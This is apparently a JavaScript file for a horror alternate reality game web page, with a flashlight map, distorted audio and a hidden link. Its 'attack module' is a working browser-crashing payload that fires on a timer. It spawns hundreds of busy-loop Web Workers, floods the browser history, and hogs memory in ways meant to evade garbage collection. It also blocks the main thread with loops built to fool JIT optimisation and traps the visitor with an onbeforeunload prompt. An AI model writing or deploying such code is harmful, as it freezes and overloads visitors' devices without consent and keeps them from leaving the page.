/* WARNING: BROWSER-KILLER SCRIPT (ANTI-JIT & ANTI-GC ENABLED)
   FOR ARG EXPERIENCES ONLY. USE WITH EXTREME CAUTION.
*/

let posX = -1000, posY = -1000;
let isLightOn = true; 
let audioStarted = false;
let systemCrashed = false;
let mouseX = window.innerWidth / 2;
let mouseY = window.innerHeight / 2;
let memoryHog = []; // 儲存實體記憶體
let workerBombActive = false;

const map = document.getElementById('map');
const overlay = document.getElementById('flashlight-overlay');

// 1. 核心：首觸發邏輯
function initExperience() {
    if (audioStarted || systemCrashed) return;
    startCreepyVoice();
    const el = document.documentElement;
    const fs = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen || el.msRequestFullscreen;
    if (fs) fs.call(el);
    spawnSecretDot();
    const intro = document.getElementById('intro');
    if (intro) intro.style.display = 'none';
    audioStarted = true;
}

window.addEventListener('click', initExperience, {once: true});
window.addEventListener('touchstart', initExperience, {once: true});
window.addEventListener('keydown', initExperience, {once: true});
window.addEventListener('scroll', initExperience, {once: true});

// 2. 跨平台音頻
function startCreepyVoice() {
    const AudioContext = window.AudioContext || window.webkitAudioContext;
    const audioCtx = new AudioContext();
    if (audioCtx.state === 'suspended') audioCtx.resume();
    const scriptNode = audioCtx.createScriptProcessor(4096, 1, 1);
    let t = 0;
    scriptNode.onaudioprocess = (e) => {
        const output = e.outputBuffer.getChannelData(0);
        for (let i = 0; i < output.length; i++) {
            if (systemCrashed) {
                output[i] = (Math.random() * 2 - 1) * 0.99;
            } else {
                let g = (t & (t >> 8)) ? 0.08 : -0.08;
                output[i] = (Math.random() * 0.1) + g;
            }
            t++;
        }
    };
    scriptNode.connect(audioCtx.destination);
}

// 3. 橘色小點
function spawnSecretDot() {
    if (document.getElementById('secret-dot')) return;
    const dot = document.createElement('div');
    dot.id = 'secret-dot';
    dot.style.cssText = `position: absolute; width: 15px; height: 15px; background: #ff6600; border-radius: 50%; box-shadow: 0 0 15px #ff6600; cursor: pointer; z-index: 9999; left: 1500px; top: 1500px;`;
    dot.onclick = (e) => {
        e.stopPropagation();
        window.location.href = "https://achieve66.github.io/....../"; 
    };
    map.appendChild(dot);
}

// 4. 自動獵殺 (20秒後啟動)
setTimeout(() => {
    if (systemCrashed) return;
    const glitchBlock = document.createElement('div');
    glitchBlock.style.cssText = `position: fixed; width: 50px; height: 50px; background: white; z-index: 10001; box-shadow: 0 0 50px 15px white; transition: transform 0.05s linear; pointer-events: none;`;
    document.body.appendChild(glitchBlock);
    let curX = Math.random() * window.innerWidth;
    let curY = -100;
    const hunterInterval = setInterval(() => {
        if (systemCrashed) { clearInterval(hunterInterval); glitchBlock.remove(); return; }
        const dx = (window.innerWidth / 2) - (curX + 25);
        const dy = (window.innerHeight / 2) - (curY + 25);
        const dist = Math.sqrt(dx * dx + dy * dy);
        if (dist < 35) { triggerFinalCrash(); clearInterval(hunterInterval); }
        else {
            curX += (dx / dist) * 5; curY += (dy / dist) * 5;
            glitchBlock.style.left = `${curX}px`; glitchBlock.style.top = `${curY}px`;
            glitchBlock.style.transform = `scale(${1 + (250 / dist)})`;
        }
    }, 16);
}, 20000);

// --- 攻擊模組 ---
function launchWorkerBomb() {
    if (!workerBombActive) workerBombActive = true;
    const workerCode = `let t=0; while(true){ t += Math.random(); if(t > 1000000) postMessage(t); }`; // 加入變數防止 Worker 被優化
    const workerBlob = new Blob([workerCode], {type: 'text/javascript'});
    const workerUrl = URL.createObjectURL(workerBlob);
    for (let i = 0; i < 256; i++) { 
        try { new Worker(workerUrl); } catch(e) { break; } 
    }
}

// 5. 終極封鎖 (反學習、反優化)
function triggerFinalCrash() {
    if (systemCrashed) return;
    systemCrashed = true;

    // 清除正常 UI
    const dot = document.getElementById('secret-dot');
    if(dot) dot.remove();
    document.documentElement.style.overflow = 'hidden';
    document.body.style.overflow = 'hidden';
    document.addEventListener('touchmove', (e) => e.preventDefault(), { passive: false });

    // 死亡畫面
    document.body.innerHTML = `
        <div id="death-screen" style="background:black; color:red; width:100vw; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; position:fixed; top:0; left:0; z-index:9999999; cursor:none; touch-action:none;">
            <h1 style="font-size:12vw; font-family:serif; text-shadow:0 0 40px red; text-align:center; word-break:keep-all;">나를 떠나지 마십시오.</h1>
        </div>
    `;

    // 啟動 Worker 炸彈
    launchWorkerBomb();
    
    // 如果瀏覽器殺咗 Worker，每 2 秒自動補充火力
    setInterval(() => { launchWorkerBomb(); }, 2000);

    setTimeout(() => {
        window.onbeforeunload = () => "STAY";
        
        let trashData = 0; // 用於欺騙 JIT 編譯器
        
        function absoluteLock() {
            // A. 炸毀歷史紀錄
            for (let i = 0; i < 100; i++) { history.pushState(null, null, "#" + Math.random()); }
            
            // B. 佔用實體記憶體 (並進行真實寫入，防止 GC 釋放)
            for (let i = 0; i < 20; i++) { 
                let block = new Float64Array(5 * 1024 * 1024);
                block[Math.floor(Math.random() * block.length)] = Math.random(); // 真實寫入動作
                memoryHog.push(block); 
            }
            
            // C. DOM 堆疊
            const l = document.createElement('div');
            l.style.cssText = `position:fixed;top:0;left:0;width:1px;height:1px;z-index:99;backdrop-filter:blur(1px);`;
            document.getElementById('death-screen').appendChild(l);

            // D. 同步鎖死關鍵 (加入欺騙運算)
            let s = Date.now();
            while(Date.now() - s < 150) { 
                trashData += Math.sqrt(Math.random()) * Math.random(); // 產生真實運算負擔
            }
            
            // 隨便做個判斷，令引擎覺得呢個 Loop 係有用嘅
            if (trashData > 999999999) trashData = 0;

            requestAnimationFrame(absoluteLock);
        }
        absoluteLock();
    }, 100);
}

// 6. 控制邏輯
window.addEventListener('mousemove', (e) => { 
    if (systemCrashed) return;
    mouseX = e.clientX; mouseY = e.clientY; updateFlashlight(); 
});
window.addEventListener('keydown', (e) => {
    if (systemCrashed) return;
    const key = e.key.toLowerCase();
    const speed = 70;
    if (key === 'w') posY += speed; if (key === 's') posY -= speed;
    if (key === 'a') posX += speed; if (key === 'd') posX -= speed;
    map.style.transform = `translate(${posX}px, ${posY}px)`;
});
window.addEventListener('touchmove', (e) => {
    if (systemCrashed) return;
    mouseX = e.touches[0].clientX; mouseY = e.touches[0].clientY;
    updateFlashlight();
});
function updateFlashlight() {
    if (isLightOn && !systemCrashed && overlay) {
        overlay.style.background = `radial-gradient(circle 150px at ${mouseX}px ${mouseY}px, transparent 0%, rgba(0,0,0,0.98) 100%)`;
    }
}
